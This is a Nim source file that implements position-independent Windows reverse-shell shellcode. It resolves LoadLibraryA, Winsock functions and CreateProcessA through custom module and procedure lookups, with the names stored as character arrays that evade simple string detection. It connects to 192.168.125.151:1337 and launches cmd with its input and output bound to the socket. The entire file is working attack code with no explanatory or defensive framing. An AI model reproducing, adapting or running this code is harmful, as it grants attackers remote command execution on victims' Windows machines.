import utils/[getmoduleh, getprocaddr, stack, fail]
import winim

#[ script.ld:

SECTIONS
{
  . = 0x140001000;
  .text : { *(.text) }
  . = 0x1400013f0;
  .data : { *(.data) }
}

]#

# declaring needed functions
type LoadLibraryA   = (proc(lpLibFileName: LPCSTR): HMODULE {.stdcall.})
type WSAStartup     = (proc(wVersionRequested: WORD, lpWSAData: LPWSADATA): int32 {.stdcall.})
type WSASocketA     = (proc(af: int32, `type`: int32, protocol: int32, lpProtocolInfo: LPWSAPROTOCOL_INFOA, g: GROUP, dwFlags: DWORD): SOCKET {.stdcall.})
type inet_addr      = (proc(cp: ptr char): int32 {.stdcall.})
type htons          = (proc(hostshort: uint16): uint16 {.stdcall.})
type connect        = (proc(s: SOCKET, name: ptr sockaddr, namelen: int32): int32 {.stdcall.})
type CreateProcessA = (proc(lpApplicationName: LPCSTR, lpCommandLine: LPSTR, lpProcessAttributes: LPSECURITY_ATTRIBUTES, lpThreadAttributes: LPSECURITY_ATTRIBUTES, bInheritHandles: WINBOOL, dwCreationFlags: DWORD, lpEnvironment: LPVOID, lpCurrentDirectory: LPCSTR, lpStartupInfo: LPSTARTUPINFOA, lpProcessInformation: LPPROCESS_INFORMATION): WINBOOL {.stdcall.})

allignStack()

#[ Start of PIC shellcode]#
var
  sHost: array[15, char] = ['1','9','2','.','1','6','8','.','1','2','5','.','1','5','1']
  port: uint16 = 1337
  wsaData: WSADATA

var
  sKernel32:        array[12, char] = ['K','E','R','N','E','L','3','2','.','d','l','l']
  sws2_32:          array[10, char] = ['w','s','2','_','3','2','.','d','l','l']
  sLoadLibraryA:    array[12, char] = ['L','o','a','d','L','i','b','r','a','r','y','A']
  sWSAStartup:      array[10, char] = ['W','S','A','S','t','a','r','t','u','p']
  sWSASocketA:      array[10, char] = ['W','S','A','S','o','c','k','e','t','A']
  sinet_addr:       array[9,  char] = ['i','n','e','t','_','a','d','d','r']
  shtons:           array[5,  char] = ['h','t','o','n','s']
  sconnect:         array[7,  char] = ['c','o','n','n','e','c','t']
  sCreateProcessA:  array[14, char] = ['C','r','e','a','t','e','P','r','o','c','e','s','s','A']

var
  hKernel32: HMODULE = getModuleHandleReplacement(cast[cstring](addr sKernel32[0]))
  pLoadLibraryA: LoadLibraryA = cast[LoadLibraryA](getProcAddressReplacement(hKernel32, cast[cstring](addr sLoadLibraryA[0])))
  hws2_32: HMODULE = pLoadLibraryA(cast[cstring](addr sws2_32[0]))
  pWSAStartup: WSAStartup = cast[WSAStartup](getProcAddressReplacement(hws2_32, cast[cstring](addr sWSAStartup[0])))
  pWSASocketA: WSASocketA = cast[WSASocketA](getProcAddressReplacement(hws2_32, cast[cstring](addr sWSASocketA[0])))
  pinet_addr: inet_addr = cast[inet_addr](getProcAddressReplacement(hws2_32, cast[cstring](addr sinet_addr[0])))
  phtons: htons = cast[htons](getProcAddressReplacement(hws2_32, cast[cstring](addr shtons[0])))
  pconnect: connect = cast[connect](getProcAddressReplacement(hws2_32, cast[cstring](addr sconnect[0])))
  pCreateProcessA: CreateProcessA = cast[CreateProcessA](getProcAddressReplacement(hKernel32, cast[cstring](addr sCreateProcessA[0])))

# call WSAStartup
var wsaStartupRes = pWSAStartup(MAKEWORD(2,2), addr wsaData)
# if socket != 0: failCatch()

# call WSASocket
var socket = pWSASocketA(2, 1, 6, NULL, cast[GROUP](0), cast[DWORD](NULL))

# create sockaddr_in struct
var sa: sockaddr_in
sa.sin_family = AF_INET
sa.sinaddr.S_addr = pinet_addr(cast[cstring](addr sHost[0]))
sa.sin_port = phtons(port)

# call connect
var connectResult = pconnect(socket, cast[ptr sockaddr](sa.addr), cast[int32](sizeof(sa)))
# if connectResult != 0: failCatch()

# call CreateProcessA
var 
  si: STARTUPINFO
  pi: PROCESS_INFORMATION
si.cb = cast[DWORD](sizeof(si))
si.dwFlags = STARTF_USESTDHANDLES
si.hStdInput = cast[HANDLE](socket)
si.hStdOutput = cast[HANDLE](socket)
si.hStdError = cast[HANDLE](socket)

discard pCreateProcessA(
  NULL,
  "cmd",
  NULL,
  NULL,
  TRUE,
  0,
  NULL,
  NULL,
  cast[LPSTARTUPINFOA](addr si),
  addr pi
)

# infinite loop to keep running
# while true:
#   discard
